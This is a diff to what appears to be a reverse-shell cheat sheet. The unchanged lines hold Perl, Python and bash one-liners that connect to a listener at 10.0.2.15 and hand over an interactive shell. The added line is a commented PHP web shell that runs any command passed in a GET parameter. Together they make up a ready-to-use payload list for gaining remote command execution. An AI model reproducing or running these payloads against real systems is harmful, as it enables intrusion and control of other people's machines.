@@ -60,6 +60,8 @@ perl -e 'use Socket;$i="10.0.2.15";$p=8081;socket(S,PF_INET,SOCK_STREAM,getproto
 
 python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.2.15", 8081)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/bash", "-i"]);'
 
+# <?php system($_GET['c']); ?>
+
 # https://www.gnucitizen.org/blog/reverse-shell-with-bash/
 exec 5<>/dev/tcp/10.0.2.15/8080
 cat <&5 | while read -r l; do $l 2>&5 >&5; done
